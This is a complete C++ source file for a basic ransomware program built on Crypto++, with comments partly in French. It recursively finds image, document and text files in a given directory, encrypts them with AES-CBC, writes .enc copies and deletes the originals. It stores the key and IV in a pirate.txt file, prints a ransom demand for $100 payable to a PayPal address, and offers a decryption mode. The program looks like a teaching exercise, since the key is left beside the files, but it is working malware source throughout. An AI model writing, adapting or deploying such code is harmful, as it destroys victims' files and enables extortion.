#include <string>
#include <vector>
#include <iostream>
#include <algorithm>
#include <experimental/filesystem>
#include "cryptopp/modes.h"
#include "cryptopp/aes.h"
#include "cryptopp/sha.h"
#include "cryptopp/filters.h"
#include <cryptopp/files.h>
#include "cryptopp/rsa.h"
#include "cryptopp/osrng.h"
#include "cryptopp/ecp.h"
#include "cryptopp/asn.h"
#include "cryptopp/oids.h"
#include "cryptopp/base64.h"
#include "cryptopp/hex.h"

#define _DEBUG

using namespace std;
namespace filesys = experimental::filesystem;
using namespace CryptoPP;

// Global variables
string DIRECTORY;
vector<string> FILE_TYPES;
vector<string> AVAILABLE_FILE_TYPES = {
    "jpg",
    "png",
    "doc",
    "pdf",
    "txt"};
vector<string> SELECTED_TYPES;
bool DECRYPTION_MODE = false;

/*
 * Get the list of all files which type is in AVAILABLE_FILE_TYPES 
 * in given directory (include files in sub directories).
 *
 * Arguments
 * 	dirPath : Path of directory to be traversed
 *
 * Returns:
 * 	vector containing paths of all the files in given directory and its sub directories
 *
 * Reference: https://thispointer.com/c-get-the-list-of-all-files-in-a-given-directory-and-its-sub-directories-using-boost-c17/
 */
vector<string> getAllFilesInDir(const string &dirPath)
{

    // Create a vector of string
    vector<string> listOfFiles;
    try
    {
        // Check if given path exists and points to a directory
        if (filesys::exists(dirPath) && filesys::is_directory(dirPath))
        {
            // Create a Recursive Directory Iterator object and points to the starting of directory
            filesys::recursive_directory_iterator iter(dirPath);

            // Create a Recursive Directory Iterator object pointing to end.
            filesys::recursive_directory_iterator end;

            // Iterate till end
            while (iter != end)
            {
                string path = iter->path().string();
                // Get the extension
                string extension = path.substr(path.find_last_of(".") + 1);
                // Extension to lower case
                transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

                // Check if the current object is a file and FILE_TYPES includes its type
                if (!filesys::is_directory(path) && find(FILE_TYPES.begin(), FILE_TYPES.end(), extension) != FILE_TYPES.end())
                {
                    // Add the file path in vector
                    listOfFiles.push_back(iter->path().string());
                }

                error_code ec;
                // Increment the iterator to point to next entry in recursive iteration
                iter.increment(ec);

                if (ec)
                {
                    cerr << "Error While Accessing : " << iter->path().string() << " :: " << ec.message() << '\n';
                }
            }
        }
    }
    catch (system_error &e)
    {
        cerr << "Exception :: " << e.what();
    }
    return listOfFiles;
}

string getFileContent(string path)
{
    ifstream ifs(path);
    string content((istreambuf_iterator<char>(ifs)),
                   (istreambuf_iterator<char>()));
    return content;
}

string encryptionAES(string message, byte key[16], byte iv[16])
{

    string cipher;
    int messageLen = message.length();

    /**Création des objets pour le chiffrement**/

    //choisir l'algorithme de chiffrement
    AES::Encryption aesEncryption(key, AES::DEFAULT_KEYLENGTH);
    //choisir le mode de chiffrement avec le vecteur d'initialisationm
    CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);

    //fixer la sortie et éventuellement le type de padding (par défaut c'est PKCS_PADDING)
    StreamTransformationFilter encryptor(cbcEncryption, new StringSink(cipher));

    //chiffrer le message
    encryptor.Put(reinterpret_cast<const unsigned char *>(message.c_str()), message.length() + 1);
    encryptor.MessageEnd();

    return cipher;
}

string decryptionAES(string message, byte key[16], byte iv[16])
{

    string original;
    int messageLen = message.length();

    /**Création des objets pour le déchiffrement**/

    //choisir l'algorithme de chiffrement
    AES::Decryption aesDecryption(key, AES::DEFAULT_KEYLENGTH);
    //choisir le mode de chiffrement avec le vecteur d'initialisationm
    CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);

    //fixer la sortie et éventuellement le type de padding (par défaut c'est PKCS_PADDING)
    StreamTransformationFilter decryptor(cbcDecryption, new StringSink(original));

    //chiffrer le message
    decryptor.Put(reinterpret_cast<const unsigned char *>(message.c_str()), message.size());
    decryptor.MessageEnd();

    return original;
}

/*
 * Encode a string using base64
 * Arguments
 *  in: string to be encoded
 *
 * Returns
 *   string containing base64 encoded in string
 */
string encoderBase64(string in)
{
    string out;

    StringSource(in, true, new Base64Encoder(new StringSink(out), false));

    return out;
}

/*
 * Decode a string using base64
 * Arguments
 *  in: string to be decoded
 *
 * Returns
 *   string containing base64 decoded in string
 */
string decoderBase64(string in)
{
    string out;

    StringSource(in, true, new Base64Decoder(new StringSink(out)));

    return out;
}

void writeFile(string path, string content)
{
    ofstream out(path);
    out << content;
    out.close();
}

void saveOptions(byte key[16], byte iv[16])
{
    string encodedKey, encodedIv;

    StringSource s1(key, 16, true,
                    new HexEncoder(
                        new StringSink(encodedKey)));

    StringSource s2(iv, 16, true,
                    new HexEncoder(
                        new StringSink(encodedIv)));

    ofstream out(DIRECTORY + "/pirate.txt");
    out << encodedKey << ":" << encodedIv;
    out.close();
}

string *getOptions()
{
    ifstream ifs(DIRECTORY + "/pirate.txt");

    string content((istreambuf_iterator<char>(ifs)),
                   (istreambuf_iterator<char>()));

    string delimiter = ":";
    size_t pos = content.find(delimiter);
    string encodedKey = content.substr(0, pos);
    content.erase(0, pos + delimiter.length());
    string encodedIv = content;
    string key, iv;

    StringSource ssk(encodedKey, true,
                     new HexDecoder(
                         new StringSink(key)) // HexDecoder
    );                                        // StringSource

    StringSource ssv(encodedIv, true,
                     new HexDecoder(
                         new StringSink(iv)) // HexDecoder
    );                                       // StringSource

    string *res = new string[2];
    res[0] = key;
    res[1] = iv;
    return res;
}

int main(int argc, char *argv[])
{
    // ------------  Parse arguments
    // NB: no arg checks because user is trustful
    for (int i = 1; i < argc; ++i)
    {
        string arg = argv[i];
        if (arg == "-d")
        {
            DIRECTORY = argv[i + 1];
            i++;
        }
        else if (arg == "-f")
        {
            FILE_TYPES.push_back(argv[i + 1]);
            i++;
        }
        else if (arg == "-1")
        {
            DECRYPTION_MODE = true;
            FILE_TYPES = {"enc"};
            i++;
        }
    }

    vector<string> filesList = getAllFilesInDir(DIRECTORY);

    if (!DECRYPTION_MODE)
    {
        byte iv[16];
        byte key[AES::DEFAULT_KEYLENGTH];

        // Create random generator
        AutoSeededRandomPool rng;
        // Generate random IV
        rng.GenerateBlock(iv, 16);
        // Generate random AES 128 Key
        rng.GenerateBlock(key, AES::DEFAULT_KEYLENGTH);

        for (const auto &path : filesList)
        {
            string content = getFileContent(path);

            string encrypted = encryptionAES(content, key, iv);
            string encryptedBase64Enc = encoderBase64(encrypted);

            string newPath = path + ".enc";
            writeFile(newPath, encryptedBase64Enc);
            remove(path.c_str());
        }

        saveOptions(key, iv);

        cout << "Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, "
             << "une rançon de 100$ doit être payée sur le compte PayPal hacker@gmail.com "
             << "pour pouvoir récupérer vos données" << endl;
    }
    else
    {
        string *options = getOptions();

        byte iv[16];
        byte key[AES::DEFAULT_KEYLENGTH];

        for (int i = 0; i < 16; i++)
        {
            key[i] = options[0][i];
            iv[i] = options[1][i];
        }

        for (const auto &path : filesList)
        {
            string content = getFileContent(path);

            string decoded = decoderBase64(content);
            string derypted = decryptionAES(decoded, key, iv);

            string newPath = path.substr(0, path.length() - 4);

            writeFile(newPath, derypted);
            remove(path.c_str());
        }

        string piratePath = DIRECTORY + "/pirate.txt";
        remove(piratePath.c_str());
    }

    return 0;
}
